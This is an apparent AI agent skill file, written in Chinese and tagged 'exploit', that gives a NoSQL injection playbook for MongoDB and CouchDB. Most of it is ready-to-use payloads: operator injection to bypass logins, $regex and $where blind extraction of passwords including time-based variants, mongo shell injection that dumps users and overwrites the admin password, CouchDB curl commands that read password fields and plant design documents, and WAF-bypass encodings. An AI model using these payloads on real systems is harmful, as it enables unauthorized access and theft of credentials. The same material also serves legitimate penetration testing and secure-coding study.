---
name: nosql-injection
description: "NoSQL 注入检测与利用。当目标使用 MongoDB/CouchDB 等 NoSQL 数据库、登录表单使用 JSON body 提交、或参数中出现 $gt/$ne/$regex 等操作符时使用。覆盖操作符注入认证绕过、$regex 盲注数据提取、$where JS 注入、CouchDB 攻击、WAF 绕过"
metadata:
  tags: "nosql,mongodb,couchdb,injection,nosql injection,NoSQL注入,$gt,$ne,$regex,$where,认证绕过,数据提取,operator injection,express,node,json body,login bypass,登录绕过,mongo,pymongo,mongoose,application/json"
  category: "exploit"
---

# NoSQL 注入方法论


NoSQL 数据库（MongoDB 为主）使用结构化查询对象而非 SQL 字符串，但这不意味着安全——当应用直接将用户输入拼接到查询对象中时，攻击者可以注入查询操作符来改变查询逻辑。

## Phase 0: 快速识别

| 信号 | 判断 |
|------|------|
| JSON 格式的登录请求 (`Content-Type: application/json`) | 高概率 MongoDB 后端 |
| Node.js / Express 技术栈 | MongoDB 是 Node.js 最常见的数据库 |
| 错误信息含 `MongoError`、`CastError`、`BSONTypeError` | 确认 MongoDB |
| URL 中有 `mongodb://` 连接字符串 | 确认 MongoDB |
| Python Flask + PyMongo / Mongoose ODM | 确认 MongoDB |
| 参数值接受对象/数组（如 `user[$ne]=x`） | 操作符注入可能 |
| CouchDB `/_all_docs`、`/_find` 端点 | CouchDB 注入 |

## Phase 1: 认证绕过（最高优先级）

NoSQL 注入最常见的利用场景是绕过登录认证。

### 1.1 操作符注入（Operator Injection）

核心思想：将 `{"username": "admin", "password": "xxx"}` 变为 `{"username": "admin", "password": {"$ne": ""}}`，使密码校验永远为真。

**JSON 格式（Content-Type: application/json）：**

```json
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```

**URL 编码格式（Content-Type: application/x-www-form-urlencoded）：**

```
username=admin&password[$ne]=
username[$ne]=invalid&password[$ne]=invalid
username=admin&password[$gt]=
username[$regex]=^adm&password[$ne]=
```

> 为什么两种格式都要试：Express 的 `qs` 中间件会自动将 `user[$ne]` 解析为 `{user: {$ne: ""}}`，但有些应用只接受 JSON，有些只接受 URL 编码。两种都试才能确保不漏。

### 1.2 快速测试流程

```
1. 正常登录请求 → 记录失败响应（状态码/长度/内容）
2. 替换 password 为 {"$ne": ""} → 对比响应差异
3. 如果 JSON 不行，换 URL 编码: password[$ne]=
4. 如果 $ne 不行，试 $gt、$gte、$exists:true
5. 绕过用户名: username={"$regex": ".*"} 配合 password={"$ne": ""}
```

### 1.3 枚举有效用户名

```json
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
{"username": {"$regex": "^ad"}, "password": {"$ne": ""}}
{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}
```

逐字符递增，根据响应差异判断用户名是否匹配。

## Phase 2: 数据提取（盲注）

当注入点不在登录场景，或需要提取具体字段值时。

### 2.1 $regex 盲注提取

原理：通过正则逐字符猜测字段值，根据响应差异（true/false、200/401、内容长度）判断字符是否正确。

```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}
```

**自动化脚本模板** → 读 [references/nosql-payloads.md](references/nosql-payloads.md)

### 2.2 $where JavaScript 注入

`$where` 操作符允许在查询中执行任意 JavaScript（MongoDB 4.x 及以下）：

```json
{"$where": "this.username == 'admin' && this.password.match(/^a.*/)"}
```

**条件判断（盲注 oracle）：**
```json
{"$where": "function(){return this.password.length > 5}"}
{"$where": "function(){return this.password[0] == 'a'}"}
```

**时间盲注：**
```json
{"$where": "function(){if(this.password.match(/^a.*/)){sleep(3000);return true;}return false;}"}
```

> `$where` 依赖服务端 JavaScript 是否启用；可通过 `--noscripting` 或 `security.javascriptEnabled: false` 禁用。MongoDB 8.0 起服务端 JavaScript（含 `$where`）被 deprecated，但 5.x/6.x/7.x 不应默认视为不可用。

### 2.3 $lookup 跨集合读取（聚合管道注入）

如果注入点在聚合管道参数中：

```json
[{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "leaked"}}]
```

## Phase 3: 高级利用

### 3.1 MongoDB SSRF（通过 ObjectId）

某些应用会用 ObjectId 的时间戳部分来生成信息：
```
ObjectId("507f1f77bcf86cd799439011")
     ↓ 前 8 位 hex = Unix 时间戳
507f1f77 → 2012-10-17T21:02:31Z
```

### 3.2 MongoDB Shell 注入

当输入被直接拼接到 `mongo` shell 命令中（罕见但致命）：

```
'; db.users.find().forEach(printjson); var x='
'; db.users.update({username:"admin"},{$set:{password:"hacked"}}); var x='
```

### 3.3 CouchDB 特有攻击

CouchDB 使用 REST API，注入方式不同：

```bash
# 未授权访问检测
curl http://TARGET:5984/_all_dbs

# Mango 查询注入（/_find 端点）
curl -X POST http://TARGET:5984/dbname/_find \
  -H "Content-Type: application/json" \
  -d '{"selector":{"password":{"$gt":null}},"fields":["_id","username","password"]}'

# 篡改 design document（需要 admin）：改变 view 输出或隐藏/污染查询结果
curl -X PUT http://TARGET:5984/testdb/_design/exploit \
  -H "Content-Type: application/json" \
  -d '{"views":{"leak":{"map":"function(doc){ if (doc.password) emit(doc._id, doc.password); }"}}}'
```

## Phase 4: 防御绕过

### 4.1 类型转换绕过

某些 WAF 只检查字符串中的 `$` 符号：
```json
// 原始
{"password": {"$ne": ""}}

// Unicode 绕过
{"password": {"\u0024ne": ""}}

// 深层嵌套
{"password": {"$not": {"$eq": "wrong_password"}}}
```

### 4.2 Content-Type 切换

如果 WAF 只检查 JSON 格式：
```
Content-Type: application/x-www-form-urlencoded
password[$ne]=&username=admin
```

反之，如果 WAF 只检查 URL 参数：
```
Content-Type: application/json
{"password": {"$ne": ""}}
```

### 4.3 操作符变体

```json
{"$ne": "x"}        // 不等于
{"$gt": ""}         // 大于空字符串
{"$gte": " "}       // 大于等于空格
{"$exists": true}   // 字段存在
{"$in": ["admin"]}  // 在列表中
{"$nin": [""]}      // 不在列表中
{"$not": {"$eq": "wrong"}}  // 双重否定
```

## 工具推荐

| 工具 | 用途 | 命令 |
|------|------|------|
| **NoSQLMap** | 自动化 NoSQL 注入 | `python nosqlmap.py -u http://TARGET/login -p username,password` |
| **mongosh** | 直接连接测试 | `mongosh mongodb://TARGET:27017` |
| **Burp Intruder** | 操作符 fuzz | 用 payload 列表逐个测试操作符 |

## 决策树

```
发现登录页面 + JSON 请求
  ├── 试 {"password":{"$ne":""}} → 成功？→ 认证绕过 ✅
  ├── 试 password[$ne]= (URL编码) → 成功？→ 认证绕过 ✅
  ├── 两种都失败
  │   ├── 检查是否有 WAF → Phase 4 绕过
  │   ├── 检查是否 MongoDB → 错误信息/指纹
  │   └── 不是 NoSQL → 尝试 SQL 注入
  └── 需要提取数据
      ├── $regex 盲注 → Phase 2.1
      ├── $where JS 注入 → Phase 2.2
      └── 聚合管道 → Phase 2.3
```

## 参考资源

- 完整 payload 表 + 自动化脚本 → [references/nosql-payloads.md](references/nosql-payloads.md)
